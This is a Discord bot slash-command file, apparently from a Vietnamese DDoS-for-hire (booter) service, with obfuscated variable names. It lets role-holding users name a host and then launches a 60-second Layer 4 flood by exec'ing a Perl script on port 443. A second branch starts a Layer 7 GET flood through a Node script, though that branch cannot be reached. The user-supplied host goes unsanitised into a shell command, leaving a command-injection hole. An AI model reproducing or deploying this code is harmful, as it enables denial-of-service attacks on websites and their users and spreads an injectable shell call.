const { MessageEmbed } = require('discord.js');
const ayarlar = require('../../ayarlar.json');
var version = ayarlar['versionbot'];
var roleID7 = ayarlar['roleID7'];
var commandroom = ayarlar['commandroom'];
var img = ayarlar['img'];
var photovip5 = ayarlar['photovip5'];
var randomgif = photovip5[Math['floor']((Math['random']() * photovip5['length']))];
module['exports'] = {
    name: 'master',
    description: 'T\u1EA5n c\xF4ng trang Web ( Layer4 )',
    type: 'CHAT_INPUT',
    cooldown: 30,
    options: [{
        name: 'methods',
        description: 'Ph\u01B0\u01A1ng ph\xE1p t\u1EA5n c\xF4ng',
        required: true,
        type: 'STRING',
        choices: [{
            name: `${'god'}`,
            value: `${'god'}`,
            description: 'Layer4',
        },
        {
            name: `${'god'}`,
            value: `${'god'}`,
            description: 'Layer4',
        },]
    }, {
        name: 'host',
        description: '\u0110\u1ECBa ch\u1EC9 t\u1EA5n c\xF4ng',
        required: true,
        type: 'STRING'
    }],
    run: async (_0xf396x7, _0xf396x8) => {
        if (!_0xf396x8['member']['roles']['cache']['has'](roleID7)) {
            return _0xf396x8['reply']({
                embeds: [new MessageEmbed()['setColor']('RANDOM')['setDescription'](`${'Ch\u1EC9 c\xF3 <@&'}${roleID7}${'> m\u1EDBi \u0111\u01B0\u1EE3c d\xF9ng l\u1EC7nh n\xE0y.'}`)['setFooter']({ text: '\xA9 OverKill' })['setTimestamp']()]
            })
        };
        const _0xf396x9 = _0xf396x8['options']['getString']('methods');
        const website = _0xf396x8['options']['getString']('host');
        if (_0xf396x9 === 'god') {
            var method = _0xf396x9;
            const { exec } = require('child_process');
            exec(`cd vip && cd L4 && perl ${method}.pl ${website} 443 65500 60`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
            console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
            const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
                value: `${' [ '}${_0xf396x8['user']['username']}${' ] '}`,
                inline: true
            }, {
                name: '**`🔗 Host:`**',
                value: `${' [ '}${website}${' ] '}`,
                inline: true
            }, {
                name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
                value: `${' [ '}${_0xf396x9}${' ] '}`,
                inline: true
            }, {
                name: '**`🕒 Thời Gian:`**',
                value: `${' [ 60 gi\xE2y ] '}`,
                inline: true
            }, {
                name: '**`🔰 Mode:`**',
                value: `${' [ Layer4 ] '}`,
                inline: true
            }, {
                name: '**`💸 Plan:`**',
                value: `${' [ MASTER ] '}`,
                inline: true
            })['setImage'](randomgif)
              ['setFooter']({ text: '\xA9 Developer: overkill3101', iconURL: img })['setTimestamp']();
            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']({ text: '\xA9 Developer: overkill3101', iconURL: img })['setTimestamp']();
            _0xf396x8['reply']({
                embeds: [_0xf396x11]
            })['then']((_0xf396x12) => {
                setTimeout(function () {
                    _0xf396x8['editReply']({
                        embeds: [_0xf396x10]
                    })
                }, 3000)
            })
        }
        if (_0xf396x9 === 'MASTER-LOAD') {
            var method = _0xf396x9;
            const { exec } = require('child_process');
            exec(`${'node vip/L7/'}${method}${'.js GET '}${website}${' http.txt 60 120 3'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
            console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
            const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
                value: `${' [ '}${_0xf396x8['user']['username']}${' ] '}`,
                inline: true
            }, {
                name: '**`🔗 Host:`**',
                value: `${' [ '}${website}${' ] '}`,
                inline: true
            }, {
                name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
                value: `${' [ '}${_0xf396x9}${' ] '}`,
                inline: true
            }, {
                name: '**`🕒 Thời Gian:`**',
                value: `${' [ 60 gi\xE2y ] '}`,
                inline: true
            }, {
                name: '**`🔰 Mode:`**',
                value: `${' [ Layer7 ] '}`,
                inline: true
            }, {
                name: '**`💸 Plan:`**',
                value: `${' [ MASTER ] '}`,
                inline: true
            })['setImage'](randomgif)
              ['setFooter']({ text: '\xA9 Developer: overkill3101', iconURL: img })['setTimestamp']();
            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']({ text: '\xA9 Developer: overkill3101', iconURL: img })['setTimestamp']();
            _0xf396x8['reply']({
                embeds: [_0xf396x11]
            })['then']((_0xf396x12) => {
                setTimeout(function () {
                    _0xf396x8['editReply']({
                        embeds: [_0xf396x10]
                    })
                }, 3000)
            })
        }
    }
};
